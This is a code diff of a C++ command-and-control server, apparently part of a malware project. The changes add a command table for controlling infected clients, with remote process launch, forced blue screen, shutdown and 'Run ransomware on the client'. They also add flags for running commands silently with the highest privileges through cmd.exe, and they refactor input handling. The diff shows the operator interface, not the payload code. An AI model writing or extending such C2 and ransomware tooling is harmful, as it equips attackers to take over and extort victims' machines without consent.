@@ -8,6 +8,44 @@
 #include <fstream>
 #include <chrono>
 
+/*
+	packet flag description
+	for printing info about the flag
+*/
+struct PacketFlagInfo {
+	std::string description;
+	unsigned int flag;
+};
+
+/*
+	possible commands to perform on the client
+	from the server
+*/
+const std::map<RemoteAction, std::string> ServerCommands =
+{
+	{ kOpenRemoteProcess, "Open a remote process." },
+	{ kPingClient,        "Send a ping to a remote host." },
+	{ kRemoteBSOD,        "Cause a BSOD on the client." },
+	{ kRemoteShutdown,    "Shutdown the clients machine." },
+	{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
+	{ kRansomwareEnable,  "Run ransomware on the client." },
+};
+
+/*
+	possible flags you can include in your command
+	includes a short description, name as a string to check for input
+	and the actual value of the flag
+*/
+const std::map<std::string, PacketFlagInfo> ServerCommandFlags =
+{
+	{ "NO_CONSOLE",          {"Run command with no console opened.",								NO_CONSOLE} },
+	{ "RUN_AS_HIGHEST",      {"Run command with highest privileges on remote host.",			    RUN_AS_HIGHEST} },
+	{ "RUN_AS_NORMAL",       {"Run command with current privileges on remote host.",			    RUN_AS_NORMAL} },
+	{ "USE_CLI",             {"Run command using cmd.exe.",										    USE_CLI} },
+	{ "RESPOND_WITH_STATUS", {"Remote host will respond to server after the command is performed.", RESPOND_WITH_STATUS } },
+	{ "PACKET_IS_A_COMMAND", {"This request is something that should be performed on the client.",  PACKET_IS_A_COMMAND} }
+};
+
 /**
  * Create two server instances, one to represent TCP and another to represent UDP.
  * 
@@ -459,9 +497,11 @@ BOOL ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
 		std::getline(std::cin, input);
 		
 		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND | NO_CONSOLE;
-		std::cout << "flags...\n";
 		cmdInfo.insert(input);
-		std::cout << "Inserted...\n";
+
+		if ( cmdInfo.buffLen == -1 ) // error
+			break;
+
 		performed = TRUE;
 		break;		
 	}
@@ -486,13 +526,13 @@ BOOL ServerInterface::SendCommandsToClients() {
 
 void ServerInterface::OutputServerCommands() {
 	std::cout << "Showing possible server commands:\n";
-	for ( auto& [val, info] : this->m_Commands ) {
+	for ( auto& [val, info] : ServerCommands ) {
 		std::cout << "\t[" << val << "] - " << info << std::endl;
 	}
 }
 
 BOOL ServerInterface::IsServerCommand(long command) {
-	return this->m_Commands.contains(static_cast<RemoteAction>(command));
+	return ServerCommands.contains(static_cast<RemoteAction>(command));
 }
 
 void ServerInterface::RunUserInputOnClients() {
@@ -593,6 +633,7 @@ void ServerInterface::RunUserInputOnClients() {
 			std::cout << "Error sending your command." << std::endl;
 			system("pause");
 		}
+
 		system("cls");
 	}
 }
@@ -863,25 +904,6 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 	std::cout << "Took " << final << " ms" << std::endl;
 
 	return response;
-}
-
-/**
- * Receive data from a client and interpret it as _Struct.
- * 
- * \param s - the socket to receive data on
- * \param encrypted - whether or not the communication is encrypted
- * \param rsaKey - if communication is encrypted, the rsa key to decrypt the incoming request
- * \return 
- */
-template <typename _Struct>
-_Struct ServerInterface::ReceiveDataFrom(SOCKET s, BOOL encrypted, RSA* rsaKey)
-{
-	_Struct outData;
-	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey, TRUE);
-	if ( !received )
-		return {};
-
-	return outData;
 }
 
 /**
